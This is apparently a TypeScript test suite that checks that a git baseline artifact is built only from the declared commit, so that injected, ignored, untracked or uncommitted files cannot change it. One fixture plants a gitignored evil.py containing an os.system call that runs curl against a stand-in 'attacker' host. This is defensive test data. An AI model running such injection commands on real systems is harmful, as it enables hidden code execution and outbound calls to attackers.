import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { CapsuleManifest } from "@hone/schema";
import { CasStore, packDirAsArtifact } from "@hone/broker";
import { measureBaseline } from "../src/backends/local.js";
import { gitIn, initScratchRepo, makeCapsule, makeRoot, manifestRaw } from "./helpers.js";

/**
 * Baseline exactness (anti-sandbagging closure): a git baseline artifact is
 * the DECLARED COMMIT's tree — materialized from validated Git blobs in a
 * private directory — never the on-disk worktree bytes. Ignored/untracked
 * injections have zero effect on the canonical artifact; dirty tracked
 * content never enters it.
 */

function gitCapsule(root: string): { capsuleDir: string; manifest: CapsuleManifest; baselineDir: string } {
  const baselineDir = join(root, "capsule", "baseline");
  initScratchRepo(baselineDir);
  // A committed .gitignore so the injection below is INVISIBLE to admission's
  // porcelain check — exactly the hole the exact materialization closes.
  writeFileSync(join(baselineDir, ".gitignore"), "evil.py\n__pycache__/\n");
  writeFileSync(join(baselineDir, "solver.py"), "def solve():\n    return 1\n");
  gitIn(baselineDir, "add", "-A");
  gitIn(baselineDir, "commit", "-m", "solver");
  const commit = gitIn(baselineDir, "rev-parse", "HEAD");
  const capsuleDir = makeCapsule(root, { baseline: { kind: "git", commit } });
  const manifest = CapsuleManifest.parse(manifestRaw({ baseline: { kind: "git", commit } }));
  return { capsuleDir, manifest, baselineDir };
}

describe("git baseline: exact declared-commit materialization", () => {
  it("ignored/untracked Python + module injection has ZERO effect on the artifact", async () => {
    const root = makeRoot();
    const { capsuleDir, manifest, baselineDir } = gitCapsule(root);
    const cas = new CasStore(join(root, ".hone-cas"));
    const clean = await measureBaseline(capsuleDir, manifest, cas);

    // Inject: a gitignored module, a bytecode cache, and a bare untracked file.
    writeFileSync(join(baselineDir, "evil.py"), "import os; os.system('curl attacker')\n");
    mkdirSync(join(baselineDir, "__pycache__"), { recursive: true });
    writeFileSync(join(baselineDir, "__pycache__", "evil.cpython-311.pyc"), "poison");
    writeFileSync(join(baselineDir, "untracked.txt"), "not committed\n");

    expect(await measureBaseline(capsuleDir, manifest, cas)).toBe(clean);
  });

  it("dirty TRACKED content never enters the artifact — the declared commit's bytes do", async () => {
    const root = makeRoot();
    const { capsuleDir, manifest, baselineDir } = gitCapsule(root);
    const cas = new CasStore(join(root, ".hone-cas"));
    const clean = await measureBaseline(capsuleDir, manifest, cas);
    // Tamper a tracked file WITHOUT committing (admission would refuse this,
    // but the trusted runner must be exact on its own).
    writeFileSync(join(baselineDir, "solver.py"), "def solve():\n    return 999\n");
    expect(await measureBaseline(capsuleDir, manifest, cas)).toBe(clean);
  });

  it("materializes the DECLARED commit even when HEAD moved past it", async () => {
    const root = makeRoot();
    const { capsuleDir, manifest, baselineDir } = gitCapsule(root);
    const cas = new CasStore(join(root, ".hone-cas"));
    const declared = await measureBaseline(capsuleDir, manifest, cas);
    writeFileSync(join(baselineDir, "solver.py"), "def solve():\n    return 2\n");
    gitIn(baselineDir, "add", "-A");
    gitIn(baselineDir, "commit", "-m", "newer");
    // The manifest still declares the ORIGINAL commit.
    expect(await measureBaseline(capsuleDir, manifest, cas)).toBe(declared);
  });

  it("cleans up: no lingering worktree registrations or gitdir worktree state", async () => {
    const root = makeRoot();
    const { capsuleDir, manifest, baselineDir } = gitCapsule(root);
    const cas = new CasStore(join(root, ".hone-cas"));
    await measureBaseline(capsuleDir, manifest, cas);
    // Deterministic per-capsule state (a global tmpdir census would race
    // sibling test workers): the gitdir registers ONLY the main worktree and
    // carries no worktrees/ residue.
    const registered = execFileSync("git", ["--git-dir", join(baselineDir, ".git"), "worktree", "list", "--porcelain"], { encoding: "utf8" });
    expect(registered).not.toContain("hone-baseline-");
    expect(registered.split("\n").filter((l) => l.startsWith("worktree ")).length).toBe(1);
    const worktreesDir = join(baselineDir, ".git", "worktrees");
    if (existsSync(worktreesDir)) expect(readdirSync(worktreesDir)).toEqual([]);
  });

  it("a bogus declared commit fails closed (and still leaves no debris)", async () => {
    const root = makeRoot();
    const { capsuleDir, baselineDir } = gitCapsule(root);
    const manifest = CapsuleManifest.parse(manifestRaw({ baseline: { kind: "git", commit: "0".repeat(40) } }));
    const cas = new CasStore(join(root, ".hone-cas"));
    await expect(measureBaseline(capsuleDir, manifest, cas)).rejects.toThrow(/hardened git .* failed/);
    const registered = execFileSync("git", ["--git-dir", join(baselineDir, ".git"), "worktree", "list", "--porcelain"], { encoding: "utf8" });
    expect(registered).not.toContain("hone-baseline-");
  });
});

describe("cas baseline: unchanged directory pack (no commit to materialize)", () => {
  it("packs baseline/ minus worktree noise", async () => {
    const root = makeRoot();
    const capsuleDir = makeCapsule(root);
    const baselineDir = join(capsuleDir, "baseline");
    mkdirSync(baselineDir, { recursive: true });
    writeFileSync(join(baselineDir, "hello.txt"), "baseline\n");
    mkdirSync(join(baselineDir, "__pycache__"), { recursive: true });
    writeFileSync(join(baselineDir, "__pycache__", "junk.pyc"), "junk");

    const root2 = makeRoot();
    const capsuleDir2 = makeCapsule(root2);
    const baselineDir2 = join(capsuleDir2, "baseline");
    mkdirSync(baselineDir2, { recursive: true });
    writeFileSync(join(baselineDir2, "hello.txt"), "baseline\n");
    const cas2 = new CasStore(join(root2, ".hone-cas"));
    const expected = await packDirAsArtifact(baselineDir2, cas2);

    const raw = JSON.parse(readFileSync(join(capsuleDir, "manifest.json"), "utf8")) as Record<string, unknown>;
    const raw2 = JSON.parse(readFileSync(join(capsuleDir2, "manifest.json"), "utf8")) as Record<string, unknown>;
    const manifest = CapsuleManifest.parse({ ...raw, baseline: { kind: "cas", hash: expected } });
    const manifest2 = CapsuleManifest.parse({ ...raw2, baseline: { kind: "cas", hash: expected } });
    const withNoise = await measureBaseline(capsuleDir, manifest, new CasStore(join(root, ".hone-cas")));
    expect(await measureBaseline(capsuleDir2, manifest2, cas2)).toBe(withNoise);
  });

  it("a capsule without baseline/ fails closed", async () => {
    const root = makeRoot();
    const capsuleDir = makeCapsule(root);
    const manifest = CapsuleManifest.parse(JSON.parse(readFileSync(join(capsuleDir, "manifest.json"), "utf8")));
    expect(existsSync(join(capsuleDir, "baseline"))).toBe(false);
    await expect(measureBaseline(capsuleDir, manifest, new CasStore(join(root, ".hone-cas")))).rejects.toThrow(/no baseline/);
  });
});
